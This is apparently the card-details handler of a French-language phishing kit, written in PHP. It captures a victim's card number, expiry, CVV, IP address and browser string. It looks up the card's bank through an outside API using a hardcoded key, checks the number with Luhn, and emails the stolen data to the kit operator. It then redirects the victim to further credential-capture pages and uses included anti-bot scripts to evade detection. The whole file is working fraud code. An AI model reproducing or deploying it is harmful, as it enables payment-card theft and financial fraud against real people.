<?php

error_reporting(0);
ob_start();
session_start();

include '../../prevents/anti1.php';
include '../../prevents/anti2.php';
include '../../prevents/anti3.php';
include '../../prevents/anti4.php';
include '../../prevents/anti5.php';
include '../../prevents/anti6.php';
include '../../prevents/anti7.php';
include '../../prevents/anti8.php';
include '../../monsterab/ab.php';
include '../../algorythm/mail.php';
include '../../algorythm/wanted_options.php';

if(isset($_POST['detailsSubmit'])){
$_SESSION['cardname'] = $_POST['cardname'];
$_SESSION['cardnum'] = $_POST['cardnum'];
$_SESSION['cardexp'] = $_POST['cardexp'];
$_SESSION['cardcvv'] = $_POST['cardcvv'];
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR']; 
$_SESSION['browserinfo'] = $_SERVER['HTTP_USER_AGENT'];

if(empty($_SESSION['cardname']) || empty($_SESSION['cardnum']) || empty($_SESSION['cardexp']) || empty($_SESSION['cardcvv']))
{
header('Location: index.php?blank=true');
}
else{
$cc = $_SESSION['cardnum'];
$bin = substr($cc, 0, 6);
$ch = curl_init();
$url = "https://api.bincodes.com/cc/?format=json&api_key=0aeea0d6c24cb8c76ed694df5ced0461&cc=$cc";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Accept-Version: 3';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$brand = '';
$type = '';
$emoji = '';
$bank = '';
$someArray = json_decode($result, true);
$emoji = $someArray['country']['emoji'];
$brand = $someArray['level'];
$type = $someArray['type'];
$bank = $someArray['bank'];
$bank_phone = $someArray['phone'];

$msg = "
🃏 jooker Rez 「Nouvelle CC」 🃏
[💳] Num. de carte : ".$_SESSION['cardnum']."
[💳] Date d'expiration: ".$_SESSION['cardexp']."
[💳] CVV : ".$_SESSION['cardcvv']."

[💳]Type : ".$type."
[💳] rand : ".$brand."
[🌍] Pays : ".$emoji."
+==========INFOS==========+
📡 Adresse IP : ".$_SESSION['ip']."
📶 User Agent : ".$_SERVER['HTTP_USER_AGENT']."
🃏 jooker 🃏
";
$subject = "💳 +1 CC ".$bin." - ".$brand." - ".$bank."  ".$_SESSION['ip'] ."💳";
$fromsender = "From: 🃏 jooker 🃏 <log@rez.fr>";

function is_valid_luhn($number) {
settype($number, 'string');
$sumTable = array(
array(0,1,2,3,4,5,6,7,8,9),
array(0,2,4,6,8,1,3,5,7,9));
$sum = 0;
$flip = 0;
for ($i = strlen($number) - 1; $i >= 0; $i--) {
$sum += $sumTable[$flip++ & 0x1][$number[$i]];
}
return $sum % 10 === 0;
}
	
if(is_valid_luhn($_SESSION['cardnum']) && is_numeric($_SESSION['cardnum'])){
mail($rezmail,$subject,$msg,$fromsender);
if($vbv == 'yes' ){
$_SESSION['vbv'] = true;
header('Location: ../vbv/');
}
else{

if($identity == 'yes'){
$_SESSION['identity'] = true;
header('Location: ../bank/');
}
else{

$_SESSION['finished'] = true;
header('Location: ../finished');
}	
}
}
else{

header('Location: index.php?refused=true');
}
}
}
else{

header('Location: ../../login/');
}

?>
